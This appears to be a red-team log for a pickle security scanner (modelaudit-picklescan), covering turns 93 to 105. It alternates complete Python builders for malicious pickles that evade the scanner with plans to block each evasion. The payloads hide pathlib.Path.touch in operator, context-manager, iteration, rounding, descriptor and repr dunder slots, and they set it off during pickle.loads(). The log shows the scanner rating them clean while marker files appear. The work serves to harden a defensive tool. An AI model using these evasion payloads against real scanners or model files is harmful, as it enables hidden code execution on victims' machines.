| `operator.itruediv` | `__itruediv__` | clean, 0 findings, 0 notices | marker created, returns `None` |
| `operator.imod` | `__imod__` | clean, 0 findings, 0 notices | marker created, returns `None` |
| `operator.ipow` | `__ipow__` | clean, 0 findings, 0 notices | marker created, returns `None` |
| `operator.ilshift` | `__ilshift__` | clean, 0 findings, 0 notices | marker created, returns `None` |
| `operator.irshift` | `__irshift__` | clean, 0 findings, 0 notices | marker created, returns `None` |
| `operator.iand` | `__iand__` | clean, 0 findings, 0 notices | marker created, returns `None` |
| `operator.ixor` | `__ixor__` | clean, 0 findings, 0 notices | marker created, returns `None` |
| `operator.ior` | `__ior__` | clean, 0 findings, 0 notices | marker created, returns `None` |

RCE mechanism:

- Reflected variant: `operator.add(0o666, instance)` first lets the integer
  left operand decline the path object, then dispatches to
  `instance.__radd__(0o666)`. Because `__radd__` points at `Path.touch`,
  CPython calls `Path.touch(instance, mode=0o666)`.
- In-place variant: `operator.iadd(instance, 0o666)` dispatches directly to
  `instance.__iadd__(0o666)`, again calling `Path.touch(instance, mode=0o666)`.
- Both paths create the marker before `pickle.loads()` returns and then return
  `None`.

Why the scanner missed it:

- The forward binary operator slots are now in the suspicious magic-method
  list, but reflected slots (`__radd__`, `__rsub__`, etc.) and in-place slots
  (`__iadd__`, `__isub__`, etc.) are still absent.
- The corresponding `operator` helpers are absent from `DANGEROUS_GLOBALS`;
  current `operator` coverage includes `call`, `attrgetter`, `itemgetter`, and
  `methodcaller`.
- `builtins.type` and `pathlib.Path.touch` are clean; `pathlib` is not a
  wildcard-dangerous module.
- The dangerous callable is hidden as a synthesized reflected or in-place
  operator method, so the final visible call target is a common operator helper
  rather than the attacker-selected callable.

Performance note: the focused next block should add the reflected and in-place
operator slot names above to the suspicious magic-method string list. This is
larger than the previous block but still just fixed literal matching in the
existing string policy, with no operator-flow modeling.

## Turn 94 - Block reflected and in-place arithmetic seeds

Blocking plan:

- Add the reflected and in-place arithmetic/bitwise dunder slots from Turn 93
  to the existing suspicious magic-method string list:
  `__radd__`, `__rsub__`, `__rmul__`, `__rmatmul__`, `__rtruediv__`,
  `__rmod__`, `__rpow__`, `__rlshift__`, `__rrshift__`, `__rand__`,
  `__rxor__`, `__ror__`, `__iadd__`, `__isub__`, `__imul__`, `__imatmul__`,
  `__itruediv__`, `__imod__`, `__ipow__`, `__ilshift__`, `__irshift__`,
  `__iand__`, `__ixor__`, and `__ior__`.
- Leave the corresponding `operator` helpers, `builtins.type`,
  `pathlib.PosixPath`, and `pathlib.Path.touch` allowed for this focused
  block. The static signal is the attacker-controlled reflected or in-place
  operator slot name.
- Add CPython oracle regressions that build
  `type(..., {"__radd__": Path.touch})`-style reflected payloads and
  `type(..., {"__iadd__": Path.touch})`-style in-place payloads for all 24
  slots, verifies scan-time detection on both construction-only controls and
  active `operator.*` RCE variants, proves the control instances do not create
  markers, then proves each operator dispatch creates its marker during
  `pickle.loads()`.
- Add a changelog entry under `[Unreleased]`.

Performance note: twenty-four literals in the existing magic-method match arm,
no reflected or in-place operator flow modeling.

## Turn 95 - Unary operator method family gap

Candidate payload:

- Create a runtime subclass with `builtins.type`.
- Use `pathlib.PosixPath` as the base class so instances are valid filesystem
  paths.
- Install `pathlib.Path.touch` as a unary operator method, for example
  `__neg__`.
- Instantiate the class with a marker path.
- Call the matching clean `operator` helper, for example
  `operator.neg(instance)`, during unpickling.

Representative protocol 4 payload builder:

```python
from pathlib import Path


def s(value: str) -> bytes:
    data = value.encode()
    if len(data) <= 0xFF:
        return b"\x8c" + bytes([len(data)]) + data
    return b"X" + len(data).to_bytes(4, "little") + data


def text(value: str) -> bytes:
    data = value.encode()
    return b"U" + bytes([len(data)]) + data


def sg(module: str, name: str) -> bytes:
    return s(module) + s(name) + b"\x93"


marker = Path("/tmp/ma_operator_neg_neg_marker")
payload = b"".join(
    [
        b"\x80\x04",
        sg("builtins", "type"),
        b"(",
        text("DerivedPath"),
        sg("pathlib", "PosixPath"),
        b"\x85",
        b"}",
        text("__neg__"),
        sg("pathlib", "Path.touch"),
        b"s",
        b"tR\x940",
        b"h\x00",
        text(str(marker)),
        b"\x85R\x940",
        sg("operator", "neg"),
        b"h\x01",
        b"\x85R.",
    ]
)
```

Proof on CPython 3.12.12 for the `__neg__` representative:

- Control scanner result: `len=134`, `status=complete`, `verdict=clean`,
  `is_clean=True`, `findings=[]`, `notices=[]`
- RCE scanner result: `len=152`, `status=complete`, `verdict=clean`,
  `is_clean=True`, `findings=[]`, `notices=[]`
- Coverage for the RCE payload: `bytes_scanned=152`, `bytes_total=152`,
  `opcode_count=33`, `raw_scan_complete=True`, `opcode_scan_complete=True`
- Scanner import references: `builtins.type`, `pathlib.PosixPath`,
  `pathlib.Path.touch`, and `operator.neg`, all with `is_dangerous=False`
- Control proof: the same pickle without the final `operator.neg` call returns
  a `DerivedPath` instance at `/tmp/ma_operator_neg_neg_marker` and does not
  create the marker
- Unpickle result: the full payload creates
  `/tmp/ma_operator_neg_neg_marker` and returns `None`

Sibling slot proof:

| Operator | Method | Scanner verdict | Runtime result |
| --- | --- | --- | --- |
| `operator.neg` | `__neg__` | clean, 0 findings, 0 notices | marker created, returns `None` |
| `operator.pos` | `__pos__` | clean, 0 findings, 0 notices | marker created, returns `None` |
| `operator.abs` | `__abs__` | clean, 0 findings, 0 notices | marker created, returns `None` |
| `operator.invert` | `__invert__` | clean, 0 findings, 0 notices | marker created, returns `None` |

RCE mechanism:

- `type(...)` builds a `pathlib.PosixPath` subclass with an attacker-controlled
  unary operator slot such as `__neg__ = pathlib.Path.touch`.
- The payload instantiates that subclass for the marker path.
- `operator.neg(instance)` dispatches to `instance.__neg__()`.
- Because `__neg__` points at `Path.touch`, CPython calls
  `Path.touch(instance)`. Unary operator methods may return arbitrary Python
  objects, so the `None` result is returned normally after the file is created.

Why the scanner missed it:

- Unary operator dunder slots `__neg__`, `__pos__`, `__abs__`, and
  `__invert__` are absent from the suspicious magic-method string list.
- The corresponding `operator` helpers are absent from `DANGEROUS_GLOBALS`;
  current `operator` coverage includes `call`, `attrgetter`, `itemgetter`, and
  `methodcaller`.
- `builtins.type` and `pathlib.Path.touch` are clean; `pathlib` is not a
  wildcard-dangerous module.
- The dangerous callable is hidden as a synthesized unary operator method, so
  the final visible call target is a common operator helper rather than the
  attacker-selected callable.
- The payload has no suspicious string seeds such as `eval(`, `exec(`,
  `__import__`, `os.system`, `subprocess`, attribute hooks, item hooks,
  containment hooks, comparison hooks, or binary operator hooks.

Performance note: the focused next block should add `__neg__`, `__pos__`,
`__abs__`, and `__invert__` to the suspicious magic-method string list. That
keeps the hot path to four additional literals in the existing string policy
and avoids unary-operator flow modeling.

## Turn 96 - Block unary operator seeds

Blocking plan:

- Add `__neg__`, `__pos__`, `__abs__`, and `__invert__` to the existing
  suspicious magic-method string list. Unary hooks can route execution through
  ordinary operator dispatch without an explicit dangerous call target.
- Leave `operator.neg`, `operator.pos`, `operator.abs`, `operator.invert`,
  `builtins.type`, `pathlib.PosixPath`, and `pathlib.Path.touch` allowed for
  this focused block. The static signal is the attacker-controlled unary
  operator slot name.
- Add a CPython oracle regression that builds
  `type(..., {"__neg__": Path.touch})`-style payloads for all four unary
  slots, verifies scan-time detection on both construction-only controls and
  active `operator.*` RCE variants, proves the control instances do not create
  markers, then proves each unary operation creates its marker during
  `pickle.loads()`.
- Add a changelog entry under `[Unreleased]`.

Performance note: four literals in the existing magic-method match arm, no
unary-operator flow modeling.

## Turn 97 - Context-manager entry method gap

Candidate payload:

- Create a runtime subclass with `builtins.type`.
- Use `pathlib.PosixPath` as the base class so instances are valid filesystem
  paths.
- Install `pathlib.Path.touch` as `__enter__` and `__exit__`.
- Instantiate `contextlib.ExitStack()` and the path subclass for a marker path.
- Call the currently clean `contextlib.ExitStack.enter_context(stack, cm)`
  during unpickling.

Representative protocol 4 payload builder:

```python
from pathlib import Path


def s(data: bytes) -> bytes:
    if len(data) <= 0xFF:
        return b"\x8c" + bytes([len(data)]) + data
    return b"X" + len(data).to_bytes(4, "little") + data


def text(value: str) -> bytes:
    data = value.encode()
    return b"U" + bytes([len(data)]) + data


def sg(module: bytes, name: bytes) -> bytes:
    return s(module) + s(name) + b"\x93"


marker = Path("/tmp/ma_contextlib_enter_context_dunder_enter_marker")
payload = b"".join(
    [
        b"\x80\x04",
        sg(b"builtins", b"type"),
        b"(",
        text("DerivedPath"),
        sg(b"pathlib", b"PosixPath"),
        b"\x85",
        b"}",
        text("__enter__"),
        sg(b"pathlib", b"Path.touch"),
        b"s",
        text("__exit__"),
        sg(b"pathlib", b"Path.touch"),
        b"s",
        b"tR\x940",
        sg(b"contextlib", b"ExitStack"),
        b")R\x940",
        b"h\x00",
        text(str(marker)),
        b"\x85R\x940",
        sg(b"contextlib", b"ExitStack.enter_context"),
        b"h\x01h\x02\x86R.",
    ]
)
```

Proof on CPython 3.12.12:

- Control scanner result: `len=218`, `status=complete`, `verdict=clean`,
  `is_clean=True`, `findings=[]`, `notices=[]`
- RCE scanner result: `len=260`, `status=complete`, `verdict=clean`,
  `is_clean=True`, `findings=[]`, `notices=[]`
- Coverage for the RCE payload: `bytes_scanned=260`, `bytes_total=260`,
  `opcode_count=46`, `raw_scan_complete=True`, `opcode_scan_complete=True`
- Scanner import references: `builtins.type`, `pathlib.PosixPath`,
  `pathlib.Path.touch`, `contextlib.ExitStack`, and
  `contextlib.ExitStack.enter_context`, all with `is_dangerous=False`
- Control proof: the same pickle without the final `enter_context` call
  returns a `DerivedPath` instance at
  `/tmp/ma_contextlib_enter_context_dunder_enter_marker` and does not create
  the marker
- Unpickle result: the full payload returns `None` and creates
  `/tmp/ma_contextlib_enter_context_dunder_enter_marker` with mode `0o644`

RCE mechanism:

- `type(...)` builds a `pathlib.PosixPath` subclass with attacker-controlled
  context-manager slots.
- `contextlib.ExitStack.enter_context(stack, cm)` resolves
  `type(cm).__enter__` and `type(cm).__exit__`, then calls `__enter__(cm)`.
- Because `__enter__` points at `Path.touch`, CPython calls
  `Path.touch(cm)`, creating the marker path before returning normally.
- `ExitStack` records the attacker-controlled `__exit__` method but does not
  need to call it for this proof; the entry hook alone is enough for execution.

Why the scanner missed it:

- Generic context-manager slots `__enter__` and `__exit__` are absent from the
  suspicious magic-method string list.
- `contextlib.ExitStack.enter_context` is absent from `DANGEROUS_GLOBALS`;
  earlier coverage blocks `ExitStack.callback`, `ExitStack.close`, and
  `ExitStack.__exit__`, but not entry dispatch.
- `builtins.type` and `pathlib.Path.touch` are clean; `pathlib` is not a
  wildcard-dangerous module.
- The dangerous callable is hidden as a synthesized context-manager hook, so
  the visible call target is a standard-library context helper rather than the
  attacker-selected callable.

Performance note: the next focused block can add `__enter__` and `__exit__` to
the existing suspicious magic-method string list, and optionally add
`contextlib.ExitStack.enter_context` as a direct dangerous global. The string
seed costs two additional literals in the existing hot path and covers other
context-manager dispatchers without modeling `with` semantics.

## Turn 98 - Block context-manager entry seeds

Blocking plan:

- Add `__enter__` and `__exit__` to the existing suspicious magic-method string
  list. These hooks can route execution through standard context-manager entry
  dispatch without an explicit attacker-selected call target.
- Add `("contextlib", "ExitStack.enter_context")` to the sorted Rust
  `DANGEROUS_GLOBALS` table. `enter_context` immediately invokes
  `type(cm).__enter__(cm)`, so a pickle call to it is an active callback
  dispatcher.
- Keep `contextlib.ExitStack` itself, `builtins.type`, `pathlib.PosixPath`, and
  `pathlib.Path.touch` allowed. The focused signals are the context-manager
  dunder seeds plus the active `enter_context` dispatcher.
- Add a CPython oracle regression that verifies the construction-only
  `type(..., {"__enter__": Path.touch, "__exit__": Path.touch})` control is
  suspicious and side-effect free, then verifies the active
  `ExitStack.enter_context(stack, cm)` variant is malicious and creates its
  marker during `pickle.loads()`.
- Add a changelog entry under `[Unreleased]`.

Performance note: two more literals in the existing magic-method matcher and
one sorted global lookup entry; no context-manager flow modeling.

## Turn 99 - Iteration protocol method family gap

Candidate payload:

- Create a runtime subclass with `builtins.type`.
- Use `pathlib.PosixPath` as the base class so instances are valid filesystem
  paths.
- Install `pathlib.Path.touch` as an iteration protocol method, for example
  `__next__`.
- Instantiate the class with a marker path.
- Call the matching clean builtin helper, for example `builtins.next(instance)`,
  during unpickling.

Representative protocol 4 payload builder:

```python
from pathlib import Path


def s(data: bytes) -> bytes:
    if len(data) <= 0xFF:
        return b"\x8c" + bytes([len(data)]) + data
    return b"X" + len(data).to_bytes(4, "little") + data


def text(value: str) -> bytes:
    data = value.encode()
    return b"U" + bytes([len(data)]) + data


def sg(module: bytes, name: bytes) -> bytes:
    return s(module) + s(name) + b"\x93"


marker = Path("/tmp/ma_builtins_next_next_marker")
payload = b"".join(
    [
        b"\x80\x04",
        sg(b"builtins", b"type"),
        b"(",
        text("DerivedPath"),
        sg(b"pathlib", b"PosixPath"),
        b"\x85",
        b"}",
        text("__next__"),
        sg(b"pathlib", b"Path.touch"),
        b"s",
        b"tR\x940",
        b"h\x00",
        text(str(marker)),
        b"\x85R\x940",
        sg(b"builtins", b"next"),
        b"h\x01\x85R.",
    ]
)
```

Proof on CPython 3.12.12 for the `__next__` representative:

- Control scanner result: `len=137`, `status=complete`, `verdict=clean`,
  `is_clean=True`, `findings=[]`, `notices=[]`
- RCE scanner result: `len=156`, `status=complete`, `verdict=clean`,
  `is_clean=True`, `findings=[]`, `notices=[]`
- Coverage for the RCE payload: `bytes_scanned=156`, `bytes_total=156`,
  `opcode_count=33`, `raw_scan_complete=True`, `opcode_scan_complete=True`
- Scanner import references: `builtins.type`, `pathlib.PosixPath`,
  `pathlib.Path.touch`, and `builtins.next`, all with `is_dangerous=False`
- Control proof: the same pickle without the final `next` call returns a
  `DerivedPath` instance at `/tmp/ma_builtins_next_next_marker` and does not
  create the marker
- Unpickle result: the full payload returns `None` and creates
  `/tmp/ma_builtins_next_next_marker` with mode `0o644`

Sibling slot proof:

| Builtin | Method | Scanner verdict | Runtime result |
| --- | --- | --- | --- |
| `builtins.next` | `__next__` | clean, 0 findings, 0 notices | marker created, returns `None` |
| `builtins.reversed` | `__reversed__` | clean, 0 findings, 0 notices | marker created, returns `None` |
| `builtins.anext` | `__anext__` | clean, 0 findings, 0 notices | marker created, returns `None` |
| `builtins.iter` | `__iter__` | clean, 0 findings, 0 notices | marker created before `TypeError` |
| `builtins.aiter` | `__aiter__` | clean, 0 findings, 0 notices | marker created before `TypeError` |

RCE mechanism:

- `type(...)` builds a `pathlib.PosixPath` subclass with an
  attacker-controlled iteration hook such as `__next__ = pathlib.Path.touch`.
- The payload instantiates that subclass for the marker path.
- `builtins.next(instance)` dispatches to `instance.__next__()`.
- Because `__next__` points at `Path.touch`, CPython calls
  `Path.touch(instance)`, creating the marker path. `next`, `reversed`, and
  `anext` accept the `None` result in these probes, so the payload returns
  normally after execution.
- `iter` and `aiter` enforce iterator return types after the hook returns, but
  their side effects have already happened by the time the type check raises.

Why the scanner missed it:

- Iteration protocol dunder slots `__iter__`, `__next__`, `__reversed__`,
  `__aiter__`, and `__anext__` are absent from the suspicious magic-method
  string list.
- The corresponding `builtins` helpers are absent from `DANGEROUS_GLOBALS`;
  current builtin coverage focuses on direct code execution and callback
  factories, not common protocol dispatch helpers.
- `builtins.type` and `pathlib.Path.touch` are clean; `pathlib` is not a
  wildcard-dangerous module.
- The dangerous callable is hidden as a synthesized iteration protocol method,
  so the final visible call target is a common builtin rather than the
  attacker-selected callable.

Performance note: the focused next block should add `__iter__`, `__next__`,
`__reversed__`, `__aiter__`, and `__anext__` to the suspicious magic-method
string list. That costs five literals in the existing string matcher and
avoids flagging common `builtins.iter`/`next`/`reversed`/`aiter`/`anext` calls
without an attacker-controlled protocol seed.

## Turn 100 - Block iteration protocol seeds

Blocking plan:

- Add `__iter__`, `__next__`, `__reversed__`, `__aiter__`, and `__anext__` to
  the existing suspicious magic-method string list. These hooks can route
  execution through common builtin protocol dispatch without exposing the
  attacker-selected callable as the final call target.
- Leave `builtins.iter`, `builtins.next`, `builtins.reversed`,
  `builtins.aiter`, and `builtins.anext` allowed for this focused block. The
  static signal is the attacker-controlled iteration protocol slot name, which
  avoids broad false positives on common benign builtin calls.
- Add a CPython oracle regression for all five Turn 99 slots. The regression
  verifies construction-only controls are suspicious and side-effect free,
  verifies the active `next`, `reversed`, and `anext` variants are suspicious
  and create markers while returning normally, and verifies the active `iter`
  and `aiter` variants are suspicious and create markers before their builtin
  return-type checks raise `TypeError`.
- Add a changelog entry under `[Unreleased]`.

Performance note: five literals in the existing magic-method matcher, no
iteration protocol flow modeling or broad builtin blocklist additions.

## Turn 101 - Numeric rounding protocol method family gap

Candidate payload:

- Create a runtime subclass with `builtins.type`.
- Use `pathlib.PosixPath` as the base class so instances are valid filesystem
  paths.
- Install `pathlib.Path.touch` as a numeric rounding protocol method, for
  example `__round__`.
- Instantiate the class with a marker path.
- Call the matching clean helper, for example `builtins.round(instance)`,
  during unpickling.

Representative protocol 4 payload builder:

```python
from pathlib import Path


def text(value: str) -> bytes:
    data = value.encode()
    if len(data) <= 0xFF:
        return b"\x8c" + bytes([len(data)]) + data
    return b"X" + len(data).to_bytes(4, "little") + data


def sg(module: bytes, name: bytes) -> bytes:
    return text(module.decode()) + text(name.decode()) + b"\x93"


marker = Path("/tmp/ma_numeric_round_round_marker")
payload = b"".join(
    [
        b"\x80\x04",
        sg(b"builtins", b"type"),
        b"(",
        text("DerivedPath"),
        sg(b"pathlib", b"PosixPath"),
        b"\x85",
        b"}",
        text("__round__"),
        sg(b"pathlib", b"Path.touch"),
        b"s",
        b"tR\x940",
        b"h\x00",
        text(str(marker)),
        b"\x85R\x940",
        sg(b"builtins", b"round"),
        b"h\x01\x85R.",
    ]
)
```

Proof on CPython 3.12.12 for the `__round__` representative:

- Control scanner result: `len=139`, `status=complete`, `verdict=clean`,
  `is_clean=True`, `findings=[]`, `notices=[]`
- RCE scanner result: `len=159`, `status=complete`, `verdict=clean`,
  `is_clean=True`, `findings=[]`, `notices=[]`
- Coverage for the RCE payload: `bytes_scanned=159`, `bytes_total=159`,
  `opcode_count=33`, `raw_scan_complete=True`, `opcode_scan_complete=True`
- Scanner import references: `builtins.type`, `pathlib.PosixPath`,
  `pathlib.Path.touch`, and `builtins.round`, all with
  `is_dangerous=False`
- Control proof: the same pickle without the final `round` call returns a
  `DerivedPath` instance at `/tmp/ma_numeric_round_round_marker` and does not
  create the marker
- Unpickle result: the full payload returns `None` and creates
  `/tmp/ma_numeric_round_round_marker` with mode `0o644`

Sibling slot proof:

| Helper | Method | Scanner verdict | Runtime result |
| --- | --- | --- | --- |
| `builtins.round` | `__round__` | clean, 0 findings, 0 notices | marker created, returns `None` |
| `math.floor` | `__floor__` | clean, 0 findings, 0 notices | marker created, returns `None` |
| `math.ceil` | `__ceil__` | clean, 0 findings, 0 notices | marker created, returns `None` |
| `math.trunc` | `__trunc__` | clean, 0 findings, 0 notices | marker created, returns `None` |

RCE mechanism:

- `type(...)` builds a `pathlib.PosixPath` subclass with an
  attacker-controlled numeric rounding hook such as
  `__round__ = pathlib.Path.touch`.
- The payload instantiates that subclass for the marker path.
- `builtins.round(instance)` dispatches to `instance.__round__()`.
- Because `__round__` points at `Path.touch`, CPython calls
  `Path.touch(instance)`, creating the marker path. The rounding helpers in
  this proof return the hook result directly, so `None` becomes the pickle load
  result after the side effect.

Why the scanner missed it:

- Numeric rounding protocol dunder slots `__round__`, `__floor__`, `__ceil__`,
  and `__trunc__` are absent from the suspicious magic-method string list.
- The corresponding helpers `builtins.round`, `math.floor`, `math.ceil`, and
  `math.trunc` are absent from `DANGEROUS_GLOBALS`.
- `builtins.type` and `pathlib.Path.touch` are clean; `pathlib` and `math` are
  not wildcard-dangerous modules.
- The dangerous callable is hidden as a synthesized numeric protocol method,
  so the final visible call target is a common numeric helper rather than the
  attacker-selected callable.
- Use `SHORT_BINUNICODE`/`BINUNICODE` operands for these method-name strings.
  Encoding `__floor__` as a legacy `SHORT_BINSTRING` can trigger an unrelated
  nested-raw-pickle heuristic, but the unicode pickle form scans clean.

Performance note: the focused next block should add `__round__`, `__floor__`,
`__ceil__`, and `__trunc__` to the suspicious magic-method string list. That
costs four literals in the existing matcher and avoids broad `builtins.round`
or `math` helper blocklist entries.

## Turn 102 - Block numeric rounding protocol seeds

Blocking plan:

- Add `__round__`, `__floor__`, `__ceil__`, and `__trunc__` to the existing
  suspicious magic-method string list. These hooks can route execution through
  common numeric helpers without exposing the attacker-selected callable as the
  final call target.
- Leave `builtins.round`, `math.floor`, `math.ceil`, and `math.trunc` allowed
  for this focused block. The static signal is the attacker-controlled numeric
  protocol slot name, which avoids broad false positives on common benign
  numeric helper calls.
- Add a CPython oracle regression for all four Turn 101 slots. The regression
  verifies construction-only controls are suspicious and side-effect free,
  then verifies each active helper dispatch is suspicious and creates its
  marker during `pickle.loads()` while returning `None`.
- Add a changelog entry under `[Unreleased]`.

Performance note: four literals in the existing magic-method matcher, no
numeric helper flow modeling or broad `math` blocklist additions.

## Turn 103 - Descriptor `__set_name__` class-creation gap

Candidate payload:

- Create a runtime descriptor subclass with `builtins.type`.
- Use `pathlib.PosixPath` as the descriptor base class so descriptor instances
  are valid filesystem paths.
- Install `pathlib.Path.touch` as the descriptor class's `__set_name__`
  method.
- Create a runtime metaclass with `__index__ = builtins.object.__sizeof__`.
- Instantiate the descriptor with a marker path.
- Create an owner class with that metaclass and the descriptor in its class
  dictionary. `type`/metaclass class creation invokes
  `descriptor.__set_name__(Owner, "x")`.

Representative protocol 4 payload builder:

```python
from pathlib import Path


def text(value: str) -> bytes:
    data = value.encode()
    if len(data) <= 0xFF:
        return b"\x8c" + bytes([len(data)]) + data
    return b"X" + len(data).to_bytes(4, "little") + data


def sg(module: str, name: str) -> bytes:
    return text(module) + text(name) + b"\x93"


marker = Path("/tmp/ma_descriptor_set_name_touch_index_marker")
payload = b"".join(
    [
        b"\x80\x04",
        sg("builtins", "type"),
        b"(",
        text("DescriptorPath"),
        sg("pathlib", "PosixPath"),
        b"\x85",
        b"}",
        text("__set_name__"),
        sg("pathlib", "Path.touch"),
        b"s",
        b"tR\x940",
        b"h\x00",
        text(str(marker)),
        b"\x85R\x940",
        sg("builtins", "type"),
        b"(",
        text("Meta"),
        sg("builtins", "type"),
        b"\x85",
        b"}",
        text("__index__"),
        sg("builtins", "object.__sizeof__"),
        b"s",
        b"tR\x940",
        b"h\x02",
        b"(",
        text("Owner"),
        b")",
        b"}",
        text("x"),
        b"h\x01",
        b"s",
        b"tR.",
    ]
)
```

Proof on CPython 3.12.12:

- Control scanner result: `len=246`, `status=complete`, `verdict=clean`,
  `is_clean=True`, `findings=[]`, `notices=[]`
- RCE scanner result: `len=264`, `status=complete`, `verdict=clean`,
  `is_clean=True`, `findings=[]`, `notices=[]`
- Coverage for the RCE payload: `bytes_scanned=264`, `bytes_total=264`,
  `opcode_count=56`, `raw_scan_complete=True`, `opcode_scan_complete=True`
- Scanner import references: `builtins.type`, `pathlib.PosixPath`,
  `pathlib.Path.touch`, and `builtins.object.__sizeof__`, all with
  `is_dangerous=False`
- Control proof: the same pickle without the owner-class creation returns a
  `DescriptorPath` instance at
  `/tmp/ma_descriptor_set_name_touch_index_marker` and does not create the
  marker
- Unpickle result: the full payload returns class `Owner` with metaclass
  `Meta` and creates `/tmp/ma_descriptor_set_name_touch_index_marker` with
  mode `0o610`

RCE mechanism:

- `type("DescriptorPath", (PosixPath,), {"__set_name__": Path.touch})`
  creates a path-like descriptor class with attacker-controlled descriptor
  setup behavior.
- `type("Meta", (type,), {"__index__": object.__sizeof__})` creates a
  metaclass whose class objects can be coerced to small integers through
  `__index__`.
- `Meta("Owner", (), {"x": descriptor})` creates an owner class. During class
  creation, CPython calls `descriptor.__set_name__(Owner, "x")`.
- Because `__set_name__` points at `Path.touch`, CPython calls
  `Path.touch(descriptor, mode=Owner, exist_ok="x")`.
- `Path.touch` coerces the `mode` argument with `Owner.__index__()`, which is
  backed by clean `object.__sizeof__`, then creates the marker path and returns
  normally. Class creation succeeds and the pickle load returns the new
  `Owner` class.

Why the scanner missed it:

- Descriptor setup hook `__set_name__` is absent from the suspicious
  magic-method string list.
- Numeric coercion hook `__index__` is absent from the suspicious magic-method
  string list, allowing the attacker to satisfy `Path.touch`'s integer `mode`
  requirement through a synthetic metaclass.
- `builtins.type` and `builtins.object.__sizeof__` are clean; `pathlib` is not
  a wildcard-dangerous module.
- The active dispatcher is ordinary class creation, not an imported helper such
  as `property.__get__`, `inspect.getmembers`, or `builtins.getattr`, so the
  existing descriptor-method blocks do not fire.

Performance note: the focused next block should add `__set_name__` and
`__index__` to the suspicious magic-method string list. That costs two
literals in the existing matcher and avoids broad blocking of `builtins.type`,
`object.__sizeof__`, or benign descriptor construction.

## Turn 104 - Block descriptor setup and index coercion seeds

Blocking plan:

- Add `__set_name__` and `__index__` to the existing suspicious magic-method
  string list. `__set_name__` can execute during ordinary class creation, and
  `__index__` can make otherwise incompatible objects satisfy integer
  arguments after dispatch.
- Leave `builtins.type`, `builtins.object.__sizeof__`, `pathlib.PosixPath`, and
  `pathlib.Path.touch` allowed for this focused block. The static signal is the
  attacker-controlled descriptor setup and numeric coercion hook names.
- Add a CPython oracle regression for the Turn 103 payload. The regression
  verifies the construction-only descriptor/metaclass control is suspicious and
  side-effect free, then verifies owner-class creation is suspicious and still
  creates its marker during `pickle.loads()` while returning the new `Owner`
  class.
- Add a changelog entry under `[Unreleased]`.

Performance note: two literals in the existing magic-method matcher, no class
creation or descriptor flow modeling.

## Turn 105 - Presentation and size protocol method family gap

Goal: produce another RCE-capable pickle that
`packages/modelaudit-picklescan` does not flag, using common representation,
size, truthiness, formatting, and length-hint protocol dispatch.

Candidate payload:

- Create a runtime subclass with `builtins.type`.
- Use `builtins.str` as the base class for presentation/size hooks so the
  instance is a valid filesystem path when passed to `pathlib.Path.touch`.
- Install `pathlib.Path.touch` as a protocol method such as `__repr__`.
- Instantiate the class with a marker path.
- Call the matching clean helper, for example `builtins.repr(instance)`,
  during unpickling.

Representative protocol 4 payload builder:

```python
from pathlib import Path


def text(value: str) -> bytes:
    data = value.encode()
    if len(data) <= 0xFF:
        return b"\x8c" + bytes([len(data)]) + data
    return b"X" + len(data).to_bytes(4, "little") + data


def sg(module: str, name: str) -> bytes:
    return text(module) + text(name) + b"\x93"


marker = Path("/tmp/ma_protocol_repr_marker")
payload = b"".join(
    [
        b"\x80\x04",
        sg("builtins", "type"),
        b"(",
        text("DerivedValue"),
        sg("builtins", "str"),
        b"\x85",
        b"}",
        text("__repr__"),
        sg("pathlib", "Path.touch"),
        b"s",
        b"tR\x940",
        b"h\x00",
        text(str(marker)),
        b"\x85R\x940",
        sg("builtins", "repr"),
        b"h\x01\x85R.",
    ]
)
```

Proof on CPython 3.12.12 for the `__repr__` representative:

- Control scanner result: `len=128`, `status=complete`, `verdict=clean`,
  `is_clean=True`, `findings=[]`, `notices=[]`
- RCE scanner result: `len=147`, `status=complete`, `verdict=clean`,
  `is_clean=True`, `findings=[]`, `notices=[]`
- Coverage for the RCE payload: `bytes_scanned=147`, `bytes_total=147`,
  `opcode_count=33`, `raw_scan_complete=True`, `opcode_scan_complete=True`
- Scanner import references: `builtins.type`, `builtins.str`,
  `pathlib.Path.touch`, and `builtins.repr`, all with
  `is_dangerous=False`
- Control proof: the same pickle without the final `repr` call returns a
  `DerivedValue` instance and does not create the marker
- Unpickle result: the full payload raises
  `TypeError: __repr__ returned non-string (type NoneType)` after creating
  `/tmp/ma_protocol_repr_marker` with mode `0o644`

Sibling slot proof:

| Helper | Method | Scanner verdict | Runtime result |
| --- | --- | --- | --- |
| `builtins.repr` | `__repr__` | clean, 0 findings, 0 notices | marker created, then return-type `TypeError` |
| `builtins.str` | `__str__` | clean, 0 findings, 0 notices | marker created, then return-type `TypeError` |
| `builtins.bytes` | `__bytes__` | clean, 0 findings, 0 notices | marker created, then return-type `TypeError` |
| `builtins.hash` | `__hash__` | clean, 0 findings, 0 notices | marker created, then return-type `TypeError` |
| `builtins.len` | `__len__` | clean, 0 findings, 0 notices | marker created, then return-type `TypeError` |
| `builtins.bool` | `__bool__` | clean, 0 findings, 0 notices | marker created, then return-type `TypeError` |
| `operator.length_hint` | `__length_hint__` | clean, 0 findings, 0 notices | marker created, then return-type `TypeError` |
| `builtins.format` | `__format__` | clean, 0 findings, 0 notices | dangling symlink created by `Path.symlink_to`, then return-type `TypeError` |

RCE mechanism:

- `type("DerivedValue", (str,), {"__repr__": Path.touch})` creates a
  path-like string subclass with attacker-controlled representation behavior.
- `DerivedValue(marker)` creates an instance whose string value is the marker
  path.
- `builtins.repr(instance)` dispatches to `instance.__repr__()`.
- Because `__repr__` points at `Path.touch`, CPython calls
  `Path.touch(instance)`, creating the marker path before validating that the
  special method returned a string.
- The same side-effect-before-return-check pattern applies to `__str__`,
  `__bytes__`, `__hash__`, `__len__`, `__bool__`, and `__length_hint__`.
- For `__format__`, `Path.symlink_to(instance, format_spec)` creates a
  symlink at the attacker-controlled path before CPython rejects the `None`
  return value.

Why the scanner missed it:

- Presentation and size protocol dunder slots `__repr__`, `__str__`,
  `__bytes__`, `__hash__`, `__len__`, `__bool__`, `__format__`, and
  `__length_hint__` are absent from the suspicious magic-method string list.
- The corresponding helpers `builtins.repr`, `builtins.str`,
  `builtins.bytes`, `builtins.hash`, `builtins.len`, `builtins.bool`,
  `builtins.format`, and `operator.length_hint` are absent from
  `DANGEROUS_GLOBALS`.
- `builtins.type`, `builtins.str`, `pathlib.Path.touch`,
  `pathlib.Path.symlink_to`, and `operator.length_hint` are clean; neither
  `pathlib` nor public `operator` is wildcard-dangerous.
- The active call target visible to the scanner is a common builtin protocol
  helper, while the attacker-selected callable is hidden in a dynamically
  synthesized special method.

Performance note: the focused next block should add the eight confirmed
